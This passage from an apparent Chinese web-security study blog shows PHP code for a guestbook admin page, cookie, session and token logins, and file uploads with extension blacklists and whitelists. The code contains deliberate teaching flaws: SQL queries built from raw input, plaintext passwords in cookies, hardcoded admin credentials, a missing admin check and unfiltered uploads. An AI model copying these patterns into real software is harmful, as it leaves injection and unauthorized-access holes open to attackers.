<span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;dome01&#x27;</span>;   <span class="hljs-comment">//固定这四个地址</span><br><br><span class="hljs-comment">//使用该函数来与数据库建立连接</span><br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbip</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> gbook-admin.php（没有做用户权限判定）</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../config.php&#x27;</span>;   <span class="hljs-comment">//包含文件</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../gbook.php&#x27;</span>;     <span class="hljs-comment">//调用该文件</span><br><br><span class="hljs-title function_ invoke__">show_gbook</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;del&#x27;</span>);   <span class="hljs-comment">//显示gbook文件内容中$con值，显示删除按钮</span><br><br><br><span class="hljs-variable">$delstr</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];     <span class="hljs-comment">//接收del的值，参数名位del</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$delstr</span>))&#123;     <span class="hljs-comment">//判断有值进入的时候再进行操作，否则不处理</span><br>    <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;delete from gbook where username = &#x27;<span class="hljs-subst">$delstr</span>&#x27;;&quot;</span>;<br>    <span class="hljs-comment">//接收完之后要重新组织SQL语句</span><br>    <span class="hljs-comment">//条件是表名为gbook，因为接收的是用户名，所以接收的列名是username，接收的值为delstr</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql2</span>))&#123;      <span class="hljs-comment">//执行该结果并将结果存储在data中,并判断一下返回结果</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;</span>;     <span class="hljs-comment">//删除成功的弹窗</span><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>这里基本把源码都放上来了，感觉有些多余，观感也不是很好，后面只选一些重要的源码和步骤发上来</p><p>‍</p><p>‍</p><h3 id="PHP应用-后台模块-Session-Cookie-Token-身份验证-唯一性"><a href="#PHP应用-后台模块-Session-Cookie-Token-身份验证-唯一性" class="headerlink" title="PHP应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性"></a>PHP应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性</h3><ol><li><p>用cookie做后台身份验证</p><ul><li><p>admin-c.php<br>登录页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//1. 接受输入的账号和密码</span><br><span class="hljs-variable">$user</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pass</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-comment">//2. 判断账号密码正确性</span><br><span class="hljs-comment">//连接数据库,进行查询</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from admin where username=&#x27;<span class="hljs-subst">$user</span>&#x27; and password=&#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-comment">//3. 判断用户登陆成功,并且生成的cookie进行保存</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$expire</span> = <span class="hljs-title function_ invoke__">time</span>() + <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span>;  <span class="hljs-comment">//一个月之后过期</span><br>        <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$expire</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$expire</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-comment">//echo &#x27;&lt;script&gt;alert(&quot;登陆成功！&quot;)&lt;/script&gt;&#x27;;</span><br>        <span class="hljs-comment">//4. 跳转至成功登陆的页面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:index-c.php&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//3_1. 判断用户登录失败并提示</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;登陆失败！&quot;)&lt;/script&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>index-c.php<br>登陆成功页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&#x27;123456&#x27;</span>)&#123;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:index-c.php&#x27;</span>);  <span class="hljs-comment">//这里不断重定向到自己实现无限循环</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>若没有cookie则会（同时这里如果拿到相应的cookie就实现了会话劫持—&gt;导致未授权登录漏洞）</p><p><img src="/assets/image-20240628223109-mi519kh.png" alt="image">​</p></li><li><p>登出页面</p><p>logout.phhp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>() - <span class="hljs-number">3600</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>() - <span class="hljs-number">3600</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-comment">// 跳转到登录页面</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: admin-c.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>用session做后台身份验证</p><ul><li><p>登录页面</p><p><img src="/assets/image-20240629105408-qyqol3z.png" alt="image">​</p><p>admin-s.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//登录文件-采用session验证</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../config.php&#x27;</span>;<br><span class="hljs-comment">//1. 接受输入的账号和密码</span><br><span class="hljs-variable">$user</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pass</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-comment">//2. 判断账号密码正确性</span><br><span class="hljs-comment">//连接数据库,进行过数据库查询将数据进行对比</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from admin where username=&#x27;<span class="hljs-subst">$user</span>&#x27; and password=&#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//如果是通过POST方法提交的表单</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-comment">//判断用户登录成功</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$data</span>) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">//启动会话</span><br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-comment">//将用户名和密码储存到会话中</span><br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>]=<span class="hljs-variable">$pass</span>;<br>        <span class="hljs-comment">//跳转到登陆成功的页面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:index-s.php&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<span class="hljs-comment">//终止脚本执行,确保页面重定向生效</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//判断用户登录失败</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;登陆失败！&quot;)&lt;/script&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>登陆成功页面</p><p><img src="/assets/image-20240629105449-mmgjepf.png" alt="image">​</p><p>登陆成功之后产生一个session文件，session文件的路径在php.ini中的<code>session.save_path</code>​里</p><p><img src="/assets/image-20240629110024-5hfzf1o.png" alt="image">​</p><p><img src="/assets/image-20240629105854-ac52sun.png" alt="image">​</p><p>index-s.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//登陆成功页面-采用session验证</span><br><span class="hljs-comment">//启动会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp; @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>]!==<span class="hljs-string">&#x27;123456&#x27;</span>)<span class="hljs-comment">//判断省去了数据库查询获取账号密码的操作，直接赋值</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:admin-s.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<span class="hljs-comment">//终止脚本执行，确保页面重定向生效</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>登出页面</p><p>logout-s.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//开始会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">//清除session变量，并销毁会话</span><br><span class="hljs-title function_ invoke__">session_unset</span>();<br><span class="hljs-title function_ invoke__">session_destroy</span>();<br><br><span class="hljs-comment">//重定向到登录页面</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:admin-s.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>用token做用户登录判断</p><p> token.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//开始会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// 生成一个16字节的随机Token，并将其转换为十六进制表示存储在Session中</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> token_check.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//开始会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//获取POST请求中的token,如果不存在则将其设置为空字符</span><br><span class="hljs-variable">$token</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-comment">//检查POST请求中的token是否与会话中的token匹配</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$token</span> !== @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]) &#123;<br>    <span class="hljs-comment">// 如果token不匹配，禁止访问</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);<br>    <span class="hljs-comment">//重新生成一个新的token并储存在会话中,以确保安全性</span><br>    @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Access denied&#x27;</span>; <span class="hljs-comment">//输出拒绝访问的消息</span><br>    <span class="hljs-keyword">exit</span>; <span class="hljs-comment">//终止脚本执行</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//如果token匹配，则重新生成一个新的token并存储在会话中，以确保安全性</span><br>    @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><br>    <span class="hljs-comment">//检查用户名和密码是否正确</span><br>    <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&#x27;123456&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录成功!&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你是管理员可以访问文件管理页面！&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录失败！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="PHP应用-文件管理模块-显示上传-黑白名单类型过滤-访问控制"><a href="#PHP应用-文件管理模块-显示上传-黑白名单类型过滤-访问控制" class="headerlink" title="PHP应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制"></a>PHP应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制</h3><ol><li><p>文件上传</p><p> <img src="/assets/image-20240629202034-1kxtwj7.png" alt="image">​</p><ul><li><p>前端功能性源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 用于标识上传文件的标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>选择文件:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 文件输入框，允许用户选择要上传的文件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;f&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 提交按钮，触发文件上传操作 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后端源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 从上传文件数组中获取文件名</span><br><span class="hljs-variable">$name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件类型</span><br><span class="hljs-variable">$type</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件大小</span><br><span class="hljs-variable">$size</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取临时文件名</span><br><span class="hljs-variable">$tmp_name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取错误码</span><br><span class="hljs-variable">$error</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><br><span class="hljs-comment">// 输出文件名</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出文件类型</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$type</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出文件大小</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$size</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出临时文件名</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tmp_name</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出错误码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br> <span class="hljs-comment">//如果成功将临时文件移动到指定目录，则输出文件上传成功</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>,<span class="hljs-string">&#x27;../upload/&#x27;</span>.<span class="hljs-variable">$name</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>黑名单过滤源码</p><ul><li><p>实现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 上传文件后缀过滤，使用黑名单机制</span><br><span class="hljs-variable">$black_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;asp&#x27;</span>, <span class="hljs-string">&#x27;jsp&#x27;</span>, <span class="hljs-string">&#x27;aspx&#x27;</span>);<br><span class="hljs-comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span><br><span class="hljs-variable">$fenge</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span><br><span class="hljs-variable">$exts</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$fenge</span>);<br><span class="hljs-comment">// 检查文件后缀是否在黑名单中</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$exts</span>, <span class="hljs-variable">$black_ext</span>)) &#123;<br>    <span class="hljs-comment">// 如果文件后缀在黑名单中，输出非法后缀文件信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;非法后缀文件&#x27;</span> . <span class="hljs-variable">$exts</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果文件后缀不在黑名单中，移动上传的文件到指定目录</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>);<br>    <span class="hljs-comment">// 输出上传成功的提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>白名单过滤源码</p><ul><li><p>实现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//白名单过滤机制</span><br>**<span class="hljs-comment">// 允许上传的文件后缀白名单</span><br><span class="hljs-variable">$allow_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);**<br><span class="hljs-comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span><br><span class="hljs-variable">$fenge</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span><br><span class="hljs-variable">$exts</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$fenge</span>);<br><span class="hljs-comment">// 检查文件后缀是否在允许的白名单中</span><br>**<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$exts</span>, <span class="hljs-variable">$allow_ext</span>)) &#123;<br>    <span class="hljs-comment">// 如果文件后缀不在白名单中，输出非法后缀文件信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;非法后缀文件&#x27;</span> . <span class="hljs-variable">$exts</span>;**<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    